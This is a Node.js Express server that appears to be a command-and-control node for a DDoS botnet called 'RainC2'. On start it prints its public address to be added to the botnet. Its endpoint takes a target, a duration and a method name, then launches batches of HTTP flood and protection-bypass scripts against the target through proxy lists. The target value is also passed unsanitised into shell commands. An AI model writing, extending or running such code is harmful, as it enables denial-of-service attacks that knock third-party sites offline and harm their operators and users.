const express = require('express');
const { exec } = require('child_process');

const app = express();
const port = process.env.PORT || process.env.SERVER_PORT || 5552;
const scrapeProxies = require('./proxy.js');

async function fetchData() {
  const response = await fetch('https://httpbin.org/get');
  const data = await response.json();
  console.log(`Copy This Add To Botnet -> http://${data.origin}:${port}`);
  return data;
}

app.get('/RainC2', (req, res) => {
  const { target, time, methods } = req.query;

  res.status(200).json({
    message: 'API request received. Executing script shortly.',
    target,
    time,
    methods
  });

  // Methods by Stevee
  if (methods === 'HTTP-SICARIO') {
    console.log('received');
    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    exec(`node methods/cibi.js ${target} ${time} 16 3 proxy.txt`);
    exec(`node methods/BYPASS.js ${target} ${time} 32 2 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 12 4 proxy.txt`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`);
  } else if (methods === 'RAW-HTTP') {
    console.log('received');
    exec(`node methods/h2-nust ${target} ${time} 15 2 proxy.txt`);
    exec(`node methods/http-panel.js ${target} ${time}`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
  } else if (methods === 'R9') {
    console.log('received');
    exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/nust.js ${target} ${time} 16 2 proxy.txt`);
    exec(`node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
       exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    exec(`node methods/BYPASS.js ${target} ${time} 8 1 proxy.txt`);
    exec(`node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
  } else if (methods === 'PRIV-TOR') {
    console.log('received');
    exec(`node methods/w-flood1.js ${target} ${time} 64 6 proxy.txt`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/high-dstat.js ${target} ${time} 16 2 proxy.txt`);
    exec(`node methods/cibi.js ${target} ${time} 12 4 proxy.txt`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/BYPASS.js ${target} ${time} 10 4 proxy.txt`);
    exec(`node methods/nust.js ${target} ${time} 10 1 proxy.txt`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
  } else if (methods === 'HOLD-PANEL') {
    console.log('received');
    exec(`node methods/http-panel.js ${target} ${time}`);
    exec(`node methods/REX-COSTUM.js ${target} ${time} 32 6 proxy.txt --randrate --full --legit --query 1`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/w-flood1.js ${target} ${time} 8 3 proxy.txt`);
    exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`);
  } else if (methods === 'R1') {
    console.log('received');
     exec(`node methods/lovenet-flash.js ${target} ${time} 65 15 proxy.txt`);
    exec(`node methods/lovenet-space.js ${target} ${time} 65 15 proxy.txt`);
    exec(`node methods/lovenet-steven.js ${target} ${time} 65 15 proxy.txt`);
    exec(`node methods/lovenet-death.js ${target} ${time} 65 15 proxy.txt`);
    exec(`node methods/cf.js ${target} ${time} 50 30`);
    exec(`node methods/browser.js ${target} ${time} 5 4 6 proxy.txt`);
        exec(`node methods/rawcaptcha.js ${target} ${time} 5 5 6`);
    exec(`node methods/Gravitus.js GET ${target} ${time} 90 10 proxy.txt --flood --http 2 --debug -full`);
    exec(`node methods/h2blast.js ${target} ${time} 19 8 proxy.txt`);
    exec(`node methods/lovenet-panel.js ${target} ${time} 65 15 proxy.txt`);
    exec(`node methods/lovenet-panel2.js ${target} ${time} 65 15 proxy.txt`);
  }
});

app.listen(port, () => {
  fetchData();
});
